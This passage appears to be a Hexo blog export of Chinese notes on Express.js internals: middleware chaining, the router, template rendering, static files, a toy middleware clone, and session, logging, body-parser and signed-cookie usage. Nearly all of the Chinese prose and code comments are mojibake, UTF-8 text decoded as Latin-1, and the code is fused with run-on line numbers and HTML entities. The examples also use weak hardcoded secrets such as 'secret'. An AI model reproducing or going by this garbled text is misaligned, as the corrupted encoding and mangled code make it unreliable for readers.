å¼‚æ­¥ä¸²è¡ŒæŽ§åˆ¶æ–¹æ¡ˆé™¤äº†ä¸Šé¢çš„è¿™ç§ä»¥å¤–ï¼Œè¿˜å¯ä»¥ç”¨es6çš„promiseçš„thené“¾ã€async/awaitã€yeildã€ç¤¾åŒºå·¥å…·ç­‰ï¼› å¯ä»¥çœ‹åˆ°ä»£ç ç¡®å®žè°ˆä¸ä¸Šé«˜çº§ðŸ˜‚ï¼Œä¸²è¡Œå¯¼è‡´çš„æ€§èƒ½è°ˆä¸ä¸Šä¼˜ç§€ï¼Œä½†æ˜¯å¾—ç›ŠäºŽæ­¤å®ƒè¶³å¤Ÿç®€å•æ˜“ç”¨ã€‚åˆ°æ­¤å¯ä»¥å‘çŽ°expressçš„ä¸­é—´ä»¶æž¶æž„å°±æ˜¯ä¸€ä¸ªä¸­é—´ä»¶çš„çš„ç®¡ç†ä¸Žæ•°ç»„éåŽ†è¿è¡Œï¼Œè¿™ä¸ªæ–¹æ¡ˆå°±è®©ç¤¾åŒºå½¢å½¢è‰²è‰²å„ç§å„æ ·çš„ä¸­é—´ä»¶å¾ˆå¥½çš„æ·»åŠ expressèƒ½åŠ›ï¼Œè¿™ç‚¹å¾ˆç®€å•ä¹Ÿå¾ˆé‡è¦ï¼Œå› ä¸ºåŽç»­çš„è·¯ç”±ã€é™æ€æ–‡ä»¶æœåŠ¡ã€ä»£ç†ç­‰éƒ½æ˜¯ä¸­é—´ä»¶ï¼Œéƒ½åœ¨è¿™ä¸ªæ¡†æž¶å†…è¿è¡Œã€‚ Routeræ˜¯ä¸€ä¸ªå†…ç½®åœ¨appå‡½æ•°ä¸Šçš„ä¸­é—´ä»¶æ¥çœ‹ä¸‹ç®€åŒ–åŽçš„router.js 1234567891011121314151617181920212223242526272829//expressåˆ›å»ºæ—¶è¿è¡Œapp.init = function()&#123; // ... çœç•¥å…¶å®ƒä»£ç  this._router = new Router(); this.usedRouter = false; // appè°ƒç”¨routeræ—¶åˆå§‹åŒ–routerä¸­é—´ä»¶ Object.defineProperty(this, 'router', &#123; configurable : true, enumerable : true, get: function () &#123; this.usedRouter = true; return this._router.middlewareInit.bind(this._router); &#125; &#125;)&#125;;// methodsæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ['get','post','put','delete',...]methods.forEach(method =&gt; &#123; app[method] = function (path) &#123; // å¦‚æžœé¦–æ¬¡è°ƒç”¨åˆ™æ”¾å…¥è·¯ç”±ä¸­é—´ä»· if(!this.usedRouter)&#123; this.use(this.router); &#125; // åŠ å…¥stack this._router.addRoute(method, path, Array.prototype.slice.call(arguments, 1)) &#125;&#125;); ä¸Šé¢çš„usedRouteræ˜¯ä¸ªå¼€å…³ï¼Œæœªå¼€å¯åˆ™ä¸åŠ å…¥routerä¸­é—´ä»¶ï¼Œå› ä¸ºåº”ç”¨ç†è®ºä¸Šä¹Ÿæ˜¯å¯èƒ½ä¸ç”¨åˆ°routerçš„ã€‚å½“app[method] å¦‚app.get(â€˜/userâ€™, fn)è°ƒç”¨åŽï¼Œåˆ™è§¦å‘this.use(this.router) ä½¿ç”¨routerä¸­é—´ä»¶ï¼ŒåŒæ—¶æŠŠusedRouterè®¾ç½®ä¸ºtrueã€‚ä¹‹åŽå¾€routerå¯¹è±¡ä¸­åŠ å…¥fnå›žè°ƒå‡½æ•°ã€‚ routerå®žé™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå¼‚æ­¥ä¸²è¡Œæµç¨‹æŽ§åˆ¶ï¼Œç®€åŒ–ç‰ˆçš„ä»£ç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637Router.prototype.addRoute = function(method, path, handles)&#123; let layer = &#123; path, handles &#125;; this.map[method] = this.map[method] || []; this.map[method].push(layer);&#125;;Router.prototype.middlewareInit = function(req, res, out)&#123; let index = 0; let method = req.method.toLowerCase() || 'get'; let stack = this.map[method]; function next(err) &#123; let layer = stack[index++]; let hasError = Boolean(err); // å¦‚æžœæ²¡æœ‰äº†åˆ™ç»“æŸä¸­é—´ä»¶ï¼Œèµ°ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ if(!layer)&#123; return hasError ? out(err) : out(); &#125; let route = utils.pathFormat(layer.path); let pathname = utils.pathFormat(urlParser(req.url).pathname || '/'); // è¿›è¡Œè¿‡æ»¤ if(route!== '' &amp;&amp; route !== pathname)&#123; return next(err); &#125; executeHandles(layer.handles, err, req, res, next); &#125; next();&#125;; routerè·Ÿconnectéžå¸¸ç±»ä¼¼ï¼Œä¸Šè¿°ç†è§£äº†connectï¼Œrouterå°±å¾ˆæ¸…æ™°äº†ã€‚ä¸€å›¾ä»¥è”½ä¹‹ï¼š å®žé™…ä¸Šrouterè¿˜æœ‰ç»†åˆ†ï¼ŒæŸä¸ªrouterè¿˜æ˜¯å¯ä»¥ç»§ç»­åšç±»ä¼¼çš„ä¸²è¡Œæµç¨‹æŽ§åˆ¶ï¼›ä¸Žä¸­é—´ä»¶ç›¸åŒï¼Œæ¯ä¸ªrouterä¸€æ—¦åœæ­¢äº†nextï¼Œæµç¨‹å°±ç»“æŸäº†ã€‚ requestç»è¿‡routerå¯ä»¥è¯·æ±‚ä¸€ä¸ªæ•°æ®ï¼Œæˆ–è€…ä¸€ä¸ªç½‘é¡µï¼›ç½‘é¡µçš„è¯æ˜¯æ€Žä¹ˆè¿”å›žçš„å‘¢ï¼ŒæŽ¥ä¸‹æ¥çœ‹ä¸‹viewçš„renderï¼› è§†å›¾-æ¨¡æ¿å¼•æ“Žæ¨¡æ¿å¼•æ“Žæ˜¯æ ¹æ®å¯¹æ¨¡æ¿ç»“åˆdataè¿›è¡Œè¿è¡Œå¤„ç†ï¼Œç”Ÿäº§real htmlï¼›è¿™è·ŸReactã€Vueã€æ¨¡æ¿å¼•æ“Žæ˜¯ç±»ä¼¼çš„ã€‚æ¨¡æ¿å¼•æ“Žä¸æ˜¯express å®žçŽ°çš„ï¼Œå®žé™…ä¸Šexpressä»…ä»…åªæ˜¯åšäº†è°ƒç”¨ï¼›è¿™é‡Œæœ‰ä¸ªé€šç”¨çš„æ”¯æŒå„ç§æ¨¡æ¿å¼•æ“Žçš„æ¨¡å—consolidate.js 1234567var cons = require('consolidate') , name = 'swig';cons[name]('views/page.html', &#123; user: 'tobi' &#125;, function(err, html)&#123; if (err) throw err; console.log(html);&#125;); expressè¦åšçš„åªæ˜¯é…ç½®ä¸Žè°ƒç”¨ï¼› 1234567891011// expressè®¾ç½®å±žæ€§app.set = function(key, value)&#123; if(this.settings.hasOwnProperty(key))&#123; return this.settings[key]; &#125; this.settings[key] = value;&#125;;app.engine = function(engine)&#123; this.settings['engine'] = engine;&#125;; é€šè¿‡è¿™ä¸¤ä¸ªå‡½æ•°è®¾ç½®viewsè§†å›¾æ‰€åœ¨çš„è·¯å¾„ã€æ¨¡æ¿å¼•æ“Žç±»åž‹ï¼Œä¹‹åŽexpresså°±å¯ä»¥ç»“åˆrouteræä¾›çš„render pageï¼Œdataï¼Œrender callbackçš„æ•°æ®è¿›è¡Œè§†å›¾æ¸²æŸ“ 1234567891011121314151617181920212223242526272829303132333435363738app.render = function (name, options, fn) &#123; let cacheTemplate = this.cache[name]; let view = cacheTemplate || new View(name, &#123; root: process.cwd(), viewPath: this.settings['views'], engine: this.settings['engine'] &#125;); if(!cacheTemplate &amp;&amp; this.settings['view cache'])&#123; this.cache[name] = view; &#125; view.render(options, fn);&#125;;// View.js ç®€åŒ–function View(page, config)&#123; console.log('view åˆå§‹åŒ–'); this.engine = config.engine || 'ejs'; this.templatePath = path.join(config.root, config.viewPath, page); this.lookup();&#125;//æ£€æµ‹æ¨¡æ¿æ˜¯å¦å­˜åœ¨View.prototype.lookup = function()&#123; if(!fs.existsSync(this.templatePath))&#123; console.log('æ¨¡æ¿æ²¡æœ‰æ‰¾åˆ°'); throw new Error('æ¨¡æ¿æ²¡æœ‰æ‰¾åˆ°'); &#125;&#125;;View.prototype.render = function (options, fn) &#123; let templatePath= this.templatePath; // è°ƒç”¨æ¨¡æ¿å¼•æ“Žå®Œæˆæ¸²æŸ“ return cons[this.engine](templatePath, options, fn);&#125;; ä¸ºäº†æ€§èƒ½è€ƒè™‘è¿˜åšäº†cacheï¼›å…³äºŽæ¨¡æ¿å¼•æ“Žï¼Œå®žé™…ä¸Šå¾ˆç®€å•ï¼Œè¯»è€…å¯ä»¥è‡ªå®šä¸€ä¸ªæ¨¡æ¿å¼•æ“Žè§„åˆ™ã€‚ é™æ€æ–‡ä»¶æœåŠ¡é™æ€æ–‡ä»¶æœåŠ¡ä¹Ÿæ˜¯ä¸€ä¸ªä¸­é—´ä»¶ï¼Œexpressåšçš„äº‹æƒ…ä¹Ÿä»…ä»…æ˜¯å¼•ç”¨ã€‚requireä¸€ä¸ªserve-staticï¼Œå†…ç½®åœ¨appå‡½æ•°ä¸Šã€‚ 123app.static = function (dir) &#123; this.use(serveStatic(process.cwd() + '/' + dir), &#123;&#125;);&#125;; å½“è°ƒç”¨app.staticæ—¶å°±ä¼šæŠŠé™æ€æ–‡ä»¶æœåŠ¡ä¸­é—´ä»¶æ”¾å…¥stackä¸­ï¼Œè¿™é‡Œä¸Žexpressè°ƒç”¨æ–¹å¼ç¨æœ‰ä¸åŒï¼Œå› ä¸ºç¬”è€…è§‰å¾—è¿™ä¹ˆå†™æ›´å¥½æ›´ç®€å•ã€‚ ç®€å•å®žçŽ°ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/**ä»¿ç…§expresså®žçŽ°ä¸­é—´ä»¶çš„åŠŸèƒ½ Created by haoxin on 2018/7/9.*/var http = require(&apos;http&apos;); var express = () =&gt; &#123; var funcs = []; // å¾…æ‰§è¡Œçš„å‡½æ•°æ•°ç»„ var app = (req, res) =&gt; &#123; var i = 0; var next = () =&gt; &#123; var task = funcs[i++]; // å–å‡ºå‡½æ•°æ•°ç»„é‡Œçš„ä¸‹ä¸€ä¸ªå‡½æ•° if (!task) &#123; // å¦‚æžœå‡½æ•°ä¸å­˜åœ¨,return return; &#125; task(req, res, next); // å¦åˆ™,æ‰§è¡Œä¸‹ä¸€ä¸ªå‡½æ•° &#125; next(); &#125; /** * useæ–¹æ³•å°±æ˜¯æŠŠå‡½æ•°æ·»åŠ åˆ°å‡½æ•°æ•°ç»„ä¸­ * @param task */ app.use = (task) =&gt; &#123; funcs.push(task); &#125; return app; // è¿”å›žå®žä¾‹ &#125;// ä¸‹é¢æ˜¯æµ‹è¯•casevar app = express();http.createServer(app).listen(&apos;3000&apos;, () =&gt; &#123; console.log(&apos;listening 3000....&apos;);&#125;);const middlewareA = (req, res, next) =&gt; &#123; if(req.url!==&quot;/favicon.ico&quot;) &#123; //é˜²æ­¢é‡å¤è¯·æ±‚ console.log(&apos;middlewareA before next()&apos;); next(); console.log(&apos;middlewareA after next()&apos;); &#125; res.end();&#125;const middlewareB = (req, res, next) =&gt; &#123; console.log(&apos;middlewareB before next()&apos;); next(); console.log(&apos;middlewareB after next()&apos;);&#125;const middlewareC = (req, res, next) =&gt; &#123; console.log(&apos;middlewareC before next()&apos;); next(); console.log(&apos;middlewareC after next()&apos;);&#125;app.use(middlewareA);app.use(middlewareB);app.use(middlewareC); https://blog.csdn.net/ppx2017/article/details/80967690 https://zhuanlan.zhihu.com/p/56947560]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_Vue%2F</url>
    <content type="text"><![CDATA[å‰è¨€]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FHopeLibrarySystem%2F</url>
    <content type="text"><![CDATA[å‰è¨€ HopeLibrarySystem é¡¹ç›®æ€»ç»“æ¡†æž¶express+ejs123// view engine setupapp.set(&apos;views&apos;, path.join(__dirname, &apos;views&apos;));app.set(&apos;view engine&apos;, &apos;ejs&apos;); Expressé‡Œæœ‰ä¸ªä¸­é—´ä»¶ï¼ˆmiddlewareï¼‰çš„æ¦‚å¿µã€‚æ‰€è°“ä¸­é—´ä»¶ï¼Œå°±æ˜¯åœ¨æ”¶åˆ°è¯·æ±‚åŽå’Œå‘é€å“åº”ä¹‹å‰è¿™ä¸ªé˜¶æ®µæ‰§è¡Œçš„ä¸€äº›å‡½æ•°ã€‚ è¦åœ¨ä¸€æ¡è·¯ç”±çš„å¤„ç†é“¾ä¸Šæ’å…¥ä¸­é—´ä»¶ï¼Œå¯ä»¥ä½¿ç”¨expresså¯¹è±¡çš„useæ–¹æ³•ã€‚è¯¥æ–¹æ³•åŽŸåž‹å¦‚ä¸‹ï¼š 1app.use([path,] function [, function...]) å½“app.useæ²¡æœ‰æä¾›pathå‚æ•°æ—¶ï¼Œè·¯å¾„é»˜è®¤ä¸ºâ€œ/â€ã€‚å½“ä½ ä¸ºæŸä¸ªè·¯å¾„å®‰è£…äº†ä¸­é—´ä»¶ï¼Œåˆ™å½“ä»¥è¯¥è·¯å¾„ä¸ºåŸºç¡€çš„è·¯å¾„è¢«è®¿é—®æ—¶ï¼Œéƒ½ä¼šåº”ç”¨è¯¥ä¸­é—´ä»¶ã€‚æ¯”å¦‚ä½ ä¸ºâ€œ/abcdâ€è®¾ç½®äº†ä¸­é—´ä»¶ï¼Œé‚£ä¹ˆâ€œ/abcd/xxxâ€è¢«è®¿é—®æ—¶ä¹Ÿä¼šåº”ç”¨è¯¥ä¸­é—´ä»¶ã€‚ ä¸­é—´ä»¶å‡½æ•°çš„åŽŸåž‹å¦‚ä¸‹ï¼š 1function (req, res, next) ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Requestå¯¹è±¡reqã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯Responseå¯¹è±¡resã€‚ç¬¬ä¸‰ä¸ªåˆ™æ˜¯ç”¨æ¥é©±åŠ¨ä¸­é—´ä»¶è°ƒç”¨é“¾çš„å‡½æ•°nextï¼Œå¦‚æžœä½ æƒ³è®©åŽé¢çš„ä¸­é—´ä»¶ç»§ç»­å¤„ç†è¯·æ±‚ï¼Œå°±éœ€è¦è°ƒç”¨nextæ–¹æ³•ã€‚ ç»™æŸä¸ªè·¯å¾„åº”ç”¨ä¸­é—´ä»¶å‡½æ•°çš„å…¸åž‹è°ƒç”¨æ˜¯è¿™æ ·çš„ï¼š 1234app.use(&apos;/abcd&apos;, function (req, res, next) &#123; console.log(req.baseUrl); next();&#125;) ç»„ä»¶express-sessionåŸºäºŽexpressæ¡†æž¶ä¸“é—¨ç”¨äºŽå¤„ç†sessionçš„ä¸­é—´ä»¶ åªéœ€è¦ç”¨express appçš„useæ–¹æ³•å°†sessionæŒ‚è½½åœ¨â€˜/â€™è·¯å¾„å³å¯ï¼Œè¿™æ ·æ‰€æœ‰çš„è·¯ç”±éƒ½å¯ä»¥è®¿é—®åˆ°sessionã€‚å¯ä»¥ç»™è¦æŒ‚è½½çš„sessionä¼ é€’ä¸åŒçš„optionå‚æ•°ï¼Œæ¥æŽ§åˆ¶sessionçš„ä¸åŒç‰¹æ€§ ä¸€æ—¦æˆ‘ä»¬å°†express-sessionä¸­é—´ä»¶ç”¨useæŒ‚è½½åŽï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„é€šè¿‡reqå‚æ•°æ¥å­˜å‚¨å’Œè®¿é—®sessionå¯¹è±¡çš„æ•°æ®ã€‚req.sessionæ˜¯ä¸€ä¸ªJSONæ ¼å¼çš„JavaScriptå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­éšæ„çš„å¢žåŠ æˆå‘˜ï¼Œè¿™äº›æˆå‘˜ä¼šè‡ªåŠ¨çš„è¢«ä¿å­˜åˆ°optionå‚æ•°æŒ‡å®šçš„åœ°æ–¹ï¼Œé»˜è®¤å³ä¸ºå†…å­˜ä¸­åŽ» 123456app.use(session(&#123; secret:&apos;hope&apos;,// å¯¹session id ç›¸å…³çš„cookie è¿›è¡Œç­¾å cookie:&#123;maxAge:1000*60*60*24*30&#125;,// è®¾ç½® session çš„æœ‰æ•ˆæ—¶é—´ï¼Œå•ä½æ¯«ç§’,å…å¯†ç ä¸€ä¸ªæœˆå†…è‡ªåŠ¨ç™»å½• resave: false,// æ˜¯å¦æ¯æ¬¡éƒ½é‡æ–°ä¿å­˜ä¼šè¯ï¼Œå»ºè®®false saveUninitialized: true,// æ˜¯å¦ä¿å­˜æœªåˆå§‹åŒ–çš„ä¼šè¯&#125;)); é»˜è®¤å­˜åœ¨å†…å­˜ï¼Œstoreå¼€å¯å­˜åœ¨æœåŠ¡å™¨ï¼Œå¦‚ä¸‹appä¼šè‡ªåŠ¨æ›¿æˆ‘ä»¬æŠŠsessionå­˜å…¥åˆ°mongodbæ•°æ®ï¼Œè€Œéžå†…å­˜ä¸­ã€‚ 1234567session(&#123; store: new MongoStore(&#123; //åˆ›å»ºæ–°çš„mongodbæ•°æ®åº“ host: &apos;localhost&apos;, //æ•°æ®åº“çš„åœ°å€ï¼Œæœ¬æœºçš„è¯å°±æ˜¯127.0.0.1ï¼Œä¹Ÿå¯ä»¥æ˜¯ç½‘ç»œä¸»æœº port: 27017, //æ•°æ®åº“çš„ç«¯å£å· db: &apos;test-app&apos; //æ•°æ®åº“çš„åç§°ã€‚ &#125;)&#125;) ç”±äºŽsessionæ˜¯å­˜åœ¨æœåŠ¡å™¨ç«¯æ•°æ®åº“çš„ï¼Œæ‰€ä»¥çš„å®ƒçš„ç”Ÿå‘½å‘¨æœŸå¯ä»¥æŒä¹…åŒ–ï¼Œè€Œä¸ä»…é™äºŽæµè§ˆå™¨å…³é—­çš„æ—¶é—´ã€‚å…·ä½“æ˜¯ç”±cookie.maxAge å†³å®šï¼šå¦‚æžœmaxAgeè®¾å®šæ˜¯1ä¸ªå°æ—¶ï¼Œé‚£ä¹ˆä»Žè¿™ä¸ªå› æµè§ˆå™¨è®¿é—®æœåŠ¡å™¨å¯¼è‡´sessionåˆ›å»ºå¼€å§‹åŽï¼Œsessionä¼šä¸€ç›´ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ï¼Œå³ä½¿æµè§ˆå™¨å…³é—­ï¼Œsessionä¹Ÿä¼šç»§ç»­å­˜åœ¨ã€‚å¦‚æžœæ­¤æ—¶æœåŠ¡å™¨å®•æœºï¼Œåªè¦å¼€æœºåŽæ•°æ®åº“æ²¡å‘ç”Ÿä¸å¯é€†è½¬çš„ç ´åï¼ŒmaxAgeæ—¶é—´æ²¡è¿‡æœŸï¼Œé‚£ä¹ˆsessionæ˜¯å¯ä»¥ç»§ç»­ä¿æŒçš„ã€‚ å½“maxAgeæ—¶é—´è¿‡æœŸåŽï¼Œsessionä¼šè‡ªåŠ¨çš„æ•°æ®åº“ä¸­ç§»é™¤ï¼Œå¯¹åº”çš„è¿˜æœ‰æµè§ˆå™¨çš„cookieã€‚ä¸è¿‡ï¼Œç”±äºŽconnect-mongoçš„ç‰¹æ®Šæœºåˆ¶ï¼ˆæ¯1åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡è¿‡æœŸsessionï¼‰ï¼Œsessionçš„ç§»é™¤å¯èƒ½åœ¨æ—¶é—´ä¸Šä¼šæœ‰ä¸€å®šçš„æ»žåŽã€‚ Morganhttp è¯·æ±‚æ—¥å¿—è®°å½•ä¸­é—´ä»¶ ä½¿ç”¨ app.use(logger(&#39;dev&#39;)); å¯ä»¥å°†è¯·æ±‚ä¿¡æ¯æ‰“å°åœ¨æŽ§åˆ¶å°ï¼Œä¾¿äºŽå¼€å‘è°ƒè¯•ï¼Œä½†å®žé™…ç”Ÿäº§çŽ¯å¢ƒä¸­ï¼Œé€šå¸¸éœ€è¦å°†æ—¥å¿—è®°å½•åœ¨æ—¥å¿—æ–‡ä»¶é‡Œ å°†æ‰€æœ‰çš„è¯·æ±‚è®°å½•åœ¨ log/ ç›®å½•ä¸‹æŒ‰æ¯æ—¥æ—¥æœŸç”Ÿæˆçš„æ–‡ä»¶ä¸­ï¼Œéœ€è¦ä½¿ç”¨ file-stream-rotator æ¨¡å—ï¼š 12345678910111213141516171819202122232425var FileStreamRotator = require(&apos;file-stream-rotator&apos;);var express = require(&apos;express&apos;);var fs = require(&apos;fs&apos;);var logger = require(&apos;morgan&apos;); var app = express();var logDirectory = __dirname + &apos;/log&apos;; // ensure log directory exists fs.existsSync(logDirectory) || fs.mkdirSync(logDirectory); // create a rotating write stream var accessLogStream = FileStreamRotator.getStream(&#123; date_format: &apos;YYYYMMDD&apos;, filename: logDirectory + &apos;/%DATE%.log&apos;, frequency: &apos;daily&apos;, verbose: false&#125;); // setup the logger app.use(logger(&apos;combined&apos;, &#123;stream: accessLogStream&#125;)); app.get(&apos;/&apos;, function (req, res) &#123; res.send(&apos;hello, world!&apos;);&#125;); body-parserå¤„ç†ç¨‹åºä¹‹å‰ï¼Œåœ¨ä¸­é—´ä»¶ä¸­å¯¹ä¼ å…¥çš„è¯·æ±‚ä½“è¿›è¡Œè§£æžï¼ˆresponse bodyï¼‰ 123text å°†æ‰€æœ‰çš„æ•°æ®ä»¥æ–‡æœ¬æ ¼å¼å­—ç¬¦ä¸²çš„è¿”å›ž formè¡¨å•ä¸­ text-plainurlencoded(&#123;extended:false&#125;);è§£æž x-www-form-urlencodedrawè§£æžäºŒè¿›åˆ¶æ•°æ® 123456789// create application/json parservar jsonParser = bodyParser.json()// create application/x-www-form-urlencoded parservar urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;)app.post(&apos;/login.do&apos;, jsonParser, (req, res) =&gt; &#123; console.log(&apos;********************&apos;) console.log(req.body) res.end();&#125;) åŠ è½½åˆ°æ²¡æœ‰æŒ‚è½½è·¯å¾„çš„ä¸­é—´ä»¶1234// parse application/x-www-form-urlencodedapp.use(bodyParser.urlencoded(&#123; extended: false &#125;))// parse application/jsonapp.use(bodyParser.json()) Cookie-parseræ–¹ä¾¿æ“ä½œå®¢æˆ·ç«¯ä¸­çš„cookieå€¼ Expresså®Œæˆcookieå€¼çš„ç­¾åï¼Œcookie-parserå®žçŽ°ç­¾åcookieçš„è§£æžã€‚ä¸¤è€…å…±ç”¨åŒä¸€ä¸ªç§˜é’¥ã€‚ ç­¾åå‰çš„cookieå€¼ä¸ºchyingpï¼Œç­¾ååŽçš„cookieå€¼ä¸ºs%3Achyingp.uVofnk6k%2B9mHQpdPlQeOfjM8B5oa6mppny9d%2BmG9rD0ï¼ŒdecodeåŽä¸ºs:chyingp.uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0ã€‚ å‡ºäºŽå®‰å…¨çš„è€ƒè™‘ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å¯¹cookieè¿›è¡Œç­¾åã€‚ 1234567891011121314151617181920var express = require(&apos;express&apos;);var cookieParser = require(&apos;cookie-parser&apos;);var app = express();// åˆå§‹åŒ–ä¸­é—´ä»¶ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºsinged secret ç­¾åapp.use(cookieParser(&apos;secret&apos;));app.use(function (req, res, next) &#123; console.log(req.cookies.nick); // chyingp console.log(req.signedCookies.nick); // chyingp next();&#125;);app.use(function (req, res, next) &#123; // ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•° &#123;signed: true&#125;ï¼Œè¡¨ç¤ºè¦å¯¹cookieè¿›è¡Œæ‘˜è¦è®¡ç®— res.cookie(&apos;nick&apos;, &apos;chyingp&apos;, &#123;signed: true&#125;); res.end(&apos;ok&apos;);&#125;);app.listen(3000); ä¾‹å­æ”¹å†™å¦‚ä¸‹ï¼Œæœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼š cookieParseråˆå§‹åŒ–æ—¶ï¼Œä¼ å…¥secretä½œä¸ºç­¾åçš„ç§˜é’¥ã€‚ è®¾ç½®cookieæ—¶ï¼Œå°†signedè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºå¯¹å³å°†è®¾ç½®çš„cookieè¿›è¡Œç­¾åã€‚ èŽ·å–cookieæ—¶ï¼Œå¯ä»¥é€šè¿‡req.cookiesï¼Œä¹Ÿå¯ä»¥é€šè¿‡req.signedCookiesèŽ·å–ã€‚ â€œè§£æžâ€ç­¾åcookieé˜¶æ®µï¼Œä¸­é—´ä»¶ä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼š å°†ç­¾åcookieå¯¹åº”çš„åŽŸå§‹å€¼æå–å‡ºæ¥ éªŒè¯ç­¾åcookieæ˜¯å¦åˆæ³• cookieç­¾åçš„ä½œç”¨ ä¸»è¦æ˜¯å‡ºäºŽå®‰å…¨è€ƒè™‘ï¼Œé˜²æ­¢cookieè¢«ç¯¡æ”¹ï¼Œå¢žå¼ºå®‰å…¨æ€§ã€‚ å‡è®¾ç½‘ç«™é€šè¿‡nickè¿™ä¸ªcookieæ¥åŒºåˆ†å½“å‰ç™»å½•çš„ç”¨æˆ·æ˜¯è°ã€‚åœ¨å‰é¢ä¾‹å­ä¸­ï¼Œç™»å½•ç”¨æˆ·çš„cookieä¸­ï¼Œnickå¯¹åº”çš„å€¼å¦‚ä¸‹ï¼š(decodeåŽçš„) 1s:chyingp.uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0 æ­¤æ—¶ï¼Œæœ‰äººè¯•å›¾ä¿®æ”¹è¿™ä¸ªcookieå€¼ï¼Œæ¥è¾¾åˆ°ä¼ªé€ èº«ä»½çš„ç›®çš„ã€‚æ¯”å¦‚ä¿®æ”¹æˆxiaomingï¼š 1s:xiaoming.uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0 å½“ç½‘ç«™æ”¶åˆ°è¯·æ±‚ï¼Œå¯¹ç­¾åcookieè¿›è¡Œè§£æžï¼Œå‘çŽ°ç­¾åéªŒè¯ä¸é€šè¿‡ã€‚ç”±æ­¤å¯åˆ¤æ–­ï¼Œcookieæ˜¯ä¼ªé€ çš„ã€‚ 1hmac(&quot;xiaoming&quot;, &quot;secret&quot;) !== &quot;uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0&quot; ç­¾åå°±ä¸€å®šèƒ½å¤Ÿç¡®ä¿å®‰å…¨å— å½“ç„¶ä¸æ˜¯ã€‚ ä¸Šä¸ªå°èŠ‚çš„ä¾‹å­ï¼Œä»…é€šè¿‡nickè¿™ä¸ªcookieçš„å€¼æ¥åˆ¤æ–­ç™»å½•çš„æ˜¯å“ªä¸ªç”¨æˆ·ï¼Œè¿™æ˜¯ä¸€ä¸ªéžå¸¸ç³Ÿç³•çš„è®¾è®¡ã€‚è™½ç„¶åœ¨ç§˜é’¥æœªçŸ¥çš„æƒ…å†µä¸‹ï¼Œå¾ˆéš¾ä¼ªé€ ç­¾åcookieã€‚ä½†ç”¨æˆ·åç›¸åŒçš„æƒ…å†µä¸‹ï¼Œç­¾åä¹Ÿæ˜¯ç›¸åŒçš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå…¶å®žæ˜¯å¾ˆå®¹æ˜“ä¼ªé€ çš„ã€‚ express.staticè®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„çš„ä¸­é—´ä»¶ 1app.use(express.static(&apos;public&apos;)); HLayer.jshttps://github.com/huruji/Hlayer https://www.jianshu.com/p/662908ec7713 made by Huruji, webå¼¹å±‚ç»„ä»¶ é‡è¦éƒ¨åˆ†1.express ä¸­æœ‰ä¸¤ä¸ªå¯¹è±¡å¯ç”¨äºŽæ¨¡æ¿çš„æ¸²æŸ“ï¼šapp.locals å’Œ res.locals é™¤äº†getæ–¹æ³•ä¸­ä½¿ç”¨renderæ¥å‘ejsæ¨¡ç‰ˆä¼ é€’å‚æ•°ï¼Œè¿˜å¯ä»¥ç”¨localså¯¹è±¡çš„å±žæ€§ä¸ºviewæä¾›å˜é‡ã€‚ åœ¨è°ƒç”¨ res.render çš„æ—¶å€™ï¼Œexpress åˆå¹¶ï¼ˆmergeï¼‰äº† 3 å¤„çš„ç»“æžœåŽä¼ å…¥è¦æ¸²æŸ“çš„æ¨¡æ¿ï¼Œä¼˜å…ˆçº§ï¼šres.render ä¼ å…¥çš„å¯¹è±¡&gt; res.locals å¯¹è±¡ &gt; app.locals å¯¹è±¡ï¼Œæ‰€ä»¥ app.locals å’Œ res.locals å‡ ä¹Žæ²¡æœ‰åŒºåˆ«ï¼Œéƒ½ç”¨æ¥æ¸²æŸ“æ¨¡æ¿ï¼Œä½¿ç”¨ä¸Šçš„åŒºåˆ«åœ¨äºŽï¼šapp.locals ä¸Šé€šå¸¸æŒ‚è½½å¸¸é‡ä¿¡æ¯ï¼ˆå¦‚åšå®¢åã€æè¿°ã€ä½œè€…ä¿¡æ¯ï¼‰ï¼Œres.locals ä¸Šé€šå¸¸æŒ‚è½½å˜é‡ä¿¡æ¯ï¼Œå³æ¯æ¬¡è¯·æ±‚å¯èƒ½çš„å€¼éƒ½ä¸ä¸€æ ·ï¼ˆå¦‚è¯·æ±‚è€…ä¿¡æ¯ï¼Œres.locals.user = req.session.userï¼‰ã€‚ 2.RESTful API æŽ¥å£è§„èŒƒ 1ï¼‰URI URI è¡¨ç¤ºèµ„æºï¼Œèµ„æºä¸€èˆ¬å¯¹åº”æœåŠ¡å™¨ç«¯é¢†åŸŸæ¨¡åž‹ä¸­çš„å®žä½“ç±»ã€‚ URIè§„èŒƒ ä¸ç”¨å¤§å†™ï¼›ç”¨ä¸­æ -ä¸ç”¨ä¸‹æ _ï¼›å‚æ•°åˆ—è¡¨è¦encodeï¼›URIä¸­çš„åè¯è¡¨ç¤ºèµ„æºé›†åˆï¼Œä½¿ç”¨å¤æ•°å½¢å¼ã€‚ 2ï¼‰Request 